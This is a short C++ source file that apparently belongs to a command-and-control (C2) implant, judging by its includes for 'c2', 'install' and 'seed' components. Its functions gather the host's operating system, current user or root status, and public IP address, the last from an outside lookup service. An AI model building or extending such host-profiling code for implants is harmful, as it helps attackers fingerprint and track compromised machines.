#include <string>

#include "c2/c2.hh"
#include "components/install.hh"
#include "components/seed.hh"
#include "components/util.hh"

const std::string GET_IP_SERVER = "https://now-dns.com/ip";


std::string getOS () {
    return util::getCmdOutput("uname | tr -d '\n'");
}


std::string getUser () {
    std::string user;

    if ( util::isRoot() ) {
        user = "root";
    } else {
        user = std::getenv("USER");
    }

    return user;
}


std::string getIPAddr () {
    return request::get(GET_IP_SERVER);
}
